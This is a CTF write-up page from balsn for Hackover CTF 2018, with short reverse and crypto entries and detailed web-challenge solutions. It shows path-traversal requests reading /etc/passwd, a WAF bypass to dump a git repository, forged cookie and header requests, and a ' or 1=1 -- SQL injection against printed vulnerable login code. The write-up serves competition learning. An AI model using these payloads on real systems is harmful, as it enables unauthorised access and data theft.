@@ -1,0 +1,422 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Hackover CTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#flagmaker">flagmaker</a>
+    
+                <a class="dropdown-item" href="#bwv2342">bwv2342</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#secure_hash-v2">secure_hash-v2</a>
+    
+                <a class="dropdown-item" href="#oblivious-transfer">oblivious-transfer</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#cyberware">cyberware</a>
+    
+                <a class="dropdown-item" href="#ez-web">ez-web</a>
+    
+                <a class="dropdown-item" href="#i-love-heddha">i-love-heddha</a>
+    
+                <a class="dropdown-item" href="#who-knows-john-dows?">who-knows-john-dows?</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#flagmaker" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">flagmaker</span>
+            </a>
+    
+<a href="#bwv2342" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bwv2342</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#secure_hash-v2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">secure_hash-v2</span>
+            </a>
+    
+<a href="#oblivious-transfer" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">oblivious-transfer</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#cyberware" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cyberware</span>
+            </a>
+    
+<a href="#ez-web" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ez-web</span>
+            </a>
+    
+<a href="#i-love-heddha" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">i-love-heddha</span>
+            </a>
+    
+<a href="#who-knows-john-dows?" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">who-knows-john-dows?</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="hackover-ctf-2018"><a class="header-link" href="#hackover-ctf-2018"></a>Hackover CTF 2018</h1>
+
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
+<h3 id="flagmaker"><a class="header-link" href="#flagmaker"></a>flagmaker</h3>
+<p><a href="https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/rev/flagmaker">https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/rev/flagmaker</a></p>
+<h3 id="bwv2342"><a class="header-link" href="#bwv2342"></a>bwv2342</h3>
+<p>This chal provide a movfuscated binary. Knowing that movfuscated binary is hard to reverse, We first simply run the binary with strace  and found that it open <code>flag.txt</code>. After some trial and error (with knowledge of the flag is of form hackover18{some text}), we quickly found out right input will be responsed with different output compared with wrong input. Now simply bruteforce the flag.</p>
+<p>flag : <code>hackover18{M0V_70_7h4_w0h173mp3r13r73_Kl4v13r}</code></p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="secure_hash-v2"><a class="header-link" href="#secure_hash-v2"></a>secure_hash v2</h3>
+<p><a href="https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/crypto/secure_hash_v2">https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/crypto/secure_hash_v2</a></p>
+<h3 id="oblivious-transfer"><a class="header-link" href="#oblivious-transfer"></a>oblivious transfer</h3>
+<p><a href="https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/crypto/oblivious">https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/crypto/oblivious</a></p>
+<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
+<h3 id="cyberware"><a class="header-link" href="#cyberware"></a>cyberware</h3>
+<p>(bookgin)</p>
+<p>We are given a webserver, which we can read some files in the directory. How about reading other directories? After a few tests, I think the backend it&#39;s probably heavilty WAFed. For example, if we have a trailing slash:</p>
+<pre class="hljs"><code>$ curl <span class="hljs-string">'http://cyberware.ctf.hackover.de:1337/fox.txt/'</span> <span class="hljs-_">-s</span>D -        
+HTTP/1.1 403 You shall not list!
+Server: Linux/cyber
+Date: Fri, 05 Oct 2018 20:38:38 GMT
+Content-type: text/cyber
+
+Protected by Cyberware 10.1</code></pre><p>Or the path starts with dot:</p>
+<pre class="hljs"><code>$ curl <span class="hljs-string">'http://cyberware.ctf.hackover.de:1337/.a'</span> <span class="hljs-_">-s</span>D -        
+HTTP/1.1 403 Dots are evil
+Server: Linux/cyber
+Date: Fri, 05 Oct 2018 21:07:18 GMT
+Content-type: text/cyber
+
+Protected by Cyberware 10.1</code></pre><p>The filtering rules are listed below:</p>
+<ol class="list">
+<li>if len(path) == 1: path will be replaced to <code>/</code></li>
+<li>if len(path) &gt; 1: the last character of the path cannot be <code>/</code></li>
+<li>The path cannot start with <code>/.</code></li>
+</ol>
+<p>Actually I even write a fuzzing script, trying to use a brute-force way to bypass the WAF. </p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> product(*[[<span class="hljs-string">'.'</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">'./'</span>, <span class="hljs-string">'../'</span>, <span class="hljs-string">'cat.txt'</span>] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>)]):
+   ...</code></pre><p>This script gives me some interesting findings: </p>
+<ol class="list">
+<li>The path can start with multiple slashes. </li>
+<li><code>../</code> can be used</li>
+</ol>
+<p>So I try to read <code>/etc/passwd</code> by visiting <code>http://cyberware.ctf.hackover.de:1337//../../../etc/passwd</code>. It works! The next problem is to find the flag, but it&#39;s not in <code>/flag</code> nor <code>/home/ctf/flag</code>. Let&#39;s try to get more inforation:</p>
+<pre class="hljs"><code>/proc/self/stat
+<span class="hljs-number">1</span> (cyberserver.py) S <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">34816</span> <span class="hljs-number">1</span> <span class="hljs-number">4194560</span> <span class="hljs-number">1983058</span> <span class="hljs-number">0</span> <span class="hljs-number">51</span> <span class="hljs-number">0</span> <span class="hljs-number">40392</span> <span class="hljs-number">20243</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20</span> <span class="hljs-number">0</span> <span class="hljs-number">187</span> <span class="hljs-number">0</span> <span class="hljs-number">75328</span> <span class="hljs-number">268914688</span> <span class="hljs-number">4920</span> <span class="hljs-number">18446744073709551615</span> <span class="hljs-number">6074536218624</span> <span class="hljs-number">6074536221952</span> <span class="hljs-number">128479825392640</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">16781312</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">17</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">6074538319272</span> <span class="hljs-number">6074538319880</span> <span class="hljs-number">6075320318234</span> <span class="hljs-number">128479825398243</span> <span class="hljs-number">128479825398277</span> <span class="hljs-number">128479825398277</span> <span class="hljs-number">128479825398391</span> <span class="hljs-number">0</span></code></pre><p>We have the filename of the source code. You can refer to <a href="https://github.com/p4-team/ctf/tree/master/2018-10-06-hackover/web_cyberware">p4&#39;s writeup</a> for the complete source code. The most important snippet is:</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> path.startswith(<span class="hljs-string">'flag.git'</span>) <span class="hljs-keyword">or</span> search(<span class="hljs-string">'\\w+/flag.git'</span>, path):
+    self.send_response(<span class="hljs-number">403</span>, <span class="hljs-string">'U NO POWER'</span>)
+    self.send_header(<span class="hljs-string">'Content-type'</span>, <span class="hljs-string">'text/cyber'</span>)
+    self.end_headers()
+    self.wfile.write(<span class="hljs-string">b"Protected by Cyberware 10.1"</span>)
+    <span class="hljs-keyword">return</span></code></pre><p><code>\w</code> <a href="https://stackoverflow.com/a/1576812">means any word character</a>. However this trivial to bypass via two slashes <code>//home/ctf//flag.git/HEAD</code>.</p>
+<p>The rest is easy: extract the git repo using <a href="https://github.com/internetwache/GitTools#dumper">gitdumper</a>. </p>
+<p>We have the flag <code>hackover18{Cyb3rw4r3_f0r_Th3_w1N}</code>.</p>
+<h3 id="ez-web"><a class="header-link" href="#ez-web"></a>ez web</h3>
+<p>(bookgin)</p>
+<p>The challenge only shows <code>under construction</code> in the index page. There is nothing interesting in the website...... I&#39;m at a loss in the beginnning and I don&#39;t know what to do next.</p>
+<p>Maybe try to profile the backend. Visiting <code>http://ez-web.ctf.hackover.de:8080/abc</code> shows the following error page:</p>
+<pre class="hljs"><code>Whitelabel <span class="hljs-keyword">Error</span> Page
+
+This application has <span class="hljs-keyword">no</span> explicit mapping <span class="hljs-keyword">for</span> /<span class="hljs-keyword">error</span>, <span class="hljs-keyword">so</span> you are seeing this <span class="hljs-keyword">as</span> a fallback.
+Thu Oct 11 01:39:16 GMT 2018
+There was <span class="hljs-keyword">an</span> unexpected <span class="hljs-keyword">error</span> (<span class="hljs-keyword">type</span>=Not Found, status=404).
+<span class="hljs-keyword">No</span> message available</code></pre><p>The backend seems to be <a href="https://www.logicbig.com/tutorials/spring-framework/spring-boot/disable-default-error-page.html">Spring Boot</a>. Then, nothing interesting.</p>
+<p>Then I think it&#39;s time to use some scanner: <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">DirBuster</a> to burst the path. I always use scanner in a very low request rate(1-2 requests per second), trying to minimize the impact on the server. Surprisingly it found <code>http://ez-web.ctf.hackover.de:8080/flag/</code> return HTTP 200. Visit the page and there is a link to <code>flag.txt</code>.</p>
+<pre class="hljs"><code>$ curl http://ez-web.ctf.hackover.de:8080/flag/flag.txt <span class="hljs-_">-s</span>D -
+HTTP/1.1 200 
+Set-Cookie: isAllowed=<span class="hljs-literal">false</span>
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 219
+Date: Thu, 11 Oct 2018 01:42:48 GMT
+
+&lt;!DOCTYPE html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Restricted Access&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;You <span class="hljs-keyword">do</span> not have permission to enter this Area. A mail has been sent to our Admins.&lt;br/&gt;You shall be arrested shortly.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>Just modify the cookie and get the flag.</p>
+<pre class="hljs"><code>$ curl <span class="hljs-string">'http://ez-web.ctf.hackover.de:8080/flag/flag.txt'</span> --cookie <span class="hljs-string">"isAllowed=true"</span>
+hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}</code></pre><h3 id="i-love-heddha"><a class="header-link" href="#i-love-heddha"></a>i-love-heddha</h3>
+<p>(bookgin)</p>
+<p>The challenge is almost the same as the last one. Starting with:</p>
+<pre class="hljs"><code>curl <span class="hljs-string">'http://207.154.226.40:8080/flag/flag.txt'</span> <span class="hljs-_">-s</span>D - --cookie <span class="hljs-string">'isAllowed=true'</span>
+HTTP/1.1 200 
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 175
+Date: Thu, 11 Oct 2018 01:46:47 GMT
+
+&lt;!DOCTYPE html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Wrong Browser detected&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;You are using the wrong browser, <span class="hljs-string">'Builder browser 1.0.1'</span> is required&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>It&#39;s definitely user-agent:</p>
+<pre class="hljs"><code>$ curl <span class="hljs-string">'http://207.154.226.40:8080/flag/flag.txt'</span> --cookie <span class="hljs-string">'isAllowed=true'</span> -H <span class="hljs-string">'User-Agent: Builder browser 1.0.1'</span>
+&lt;!DOCTYPE html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Almost&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;p&gt;You are refered from the wrong location hackover.18 would be the correct place to come from.&lt;/p&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>It&#39;s referer, and then get the flag!</p>
+<pre class="hljs"><code>$ curl <span class="hljs-_">-s</span> <span class="hljs-string">'http://207.154.226.40:8080/flag/flag.txt'</span> --cookie <span class="hljs-string">'isAllowed=true'</span> -H <span class="hljs-string">'User-Agent: Builder browser 1.0.1'</span> --referer <span class="hljs-string">'hackover.18'</span> | base64 <span class="hljs-_">-d</span>
+hackover18{4ngryW3bS3rv3rS4ysN0}</code></pre><p>It&#39;s worth to mention here: after the problem released, it takes only about a few minutes and one team got the firstblood. Therfore, this problem should be intuitive and easy to tackle. </p>
+<p>On the contrary, we will stay away from some challenges that few teams solved, and those teams are not in top 30. This probably means the challenge itself is poorly designed, or some guessing / mind-reading the organizers is required such that even the top 10 teams cannot solve.</p>
+<h3 id="who-knows-john-dows?"><a class="header-link" href="#who-knows-john-dows?"></a>who knows john dows?</h3>
+<p>(bookgin)</p>
+<blockquote>
+<p>You know nothing, Jon Snow - Ygritte</p>
+</blockquote>
+<p>We are given a website and a Github link to the source code <a href="https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb">https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb</a>.</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserRepo</span></span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(database)</span></span>
+    @database = database
+    @users = database[<span class="hljs-symbol">:users</span>]
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(identification, password)</span></span>
+    hashed_input_password = hash(password)
+    query = <span class="hljs-string">"select id, phone, email from users where email = '<span class="hljs-subst">#{identification}</span>' and password_digest = '<span class="hljs-subst">#{hashed_input_password}</span>' limit 1"</span>
+    puts <span class="hljs-string">"SQL executing: '<span class="hljs-subst">#{query}</span>'"</span>
+    @database[query].first <span class="hljs-keyword">if</span> user_exists?(identification)
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_exists?</span><span class="hljs-params">(identification)</span></span>
+    !get_user_by_identification(identification).<span class="hljs-literal">nil</span>?
+  <span class="hljs-keyword">end</span>
+
+  private
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_user_by_identification</span><span class="hljs-params">(identification)</span></span>
+    @users.where(<span class="hljs-symbol">phone:</span> identification).<span class="hljs-keyword">or</span>(<span class="hljs-symbol">email:</span> identification).first
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hash</span><span class="hljs-params">(password)</span></span>
+    password.reverse
+  <span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">end</span></code></pre><p>If we have a correct phone or email, we can easily perform a SQL injection. It&#39;s hard to come out a way to guess the phone, but the email is usually public. Maybe we can take a look at the git commit:</p>
+<pre class="hljs"><code>$ git <span class="hljs-built_in">log</span>
+commit b26aed283d56c65845b02957a11d90bc091ac35a (HEAD -&gt; master, origin/master, origin/HEAD)
+Author: John Doe &lt;angelo_muh@yahoo.org&gt;
+Date:   Tue Oct 2 23:55:57 2018 +0200
+
+    Add login method
+
+commit 5383fb4179f1aec972c5f2cc956a0fee07af353a
+Author: John Doe &lt;jamez@hemail.com&gt;
+Date:   Tue Oct 2 23:04:13 2018 +0200
+
+    Add methods
+
+commit 2d3e1dc0c5712efd9a0c7a13d2f0a8faaf51153c
+Author: John Doe &lt;john_doe@gmail.com&gt;
+Date:   Tue Oct 2 23:02:26 2018 +0200
+
+    Add dependency injection <span class="hljs-keyword">for</span> database
+
+commit 3ec70acbf846037458c93e8d0cb79a6daac98515
+Author: John Doe &lt;john_doe@notes.h18&gt;
+Date:   Tue Oct 2 23:01:30 2018 +0200
+
+    Add user repo class and file</code></pre><p>Just try all of them. The correct mail is <a href="mailto:`john_doe@notes.h18">`john_doe@notes.h18</a><code>, and then we simply login with</code>&#39; or 1=1 --` SQL injection. Note that the string will be reversed.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
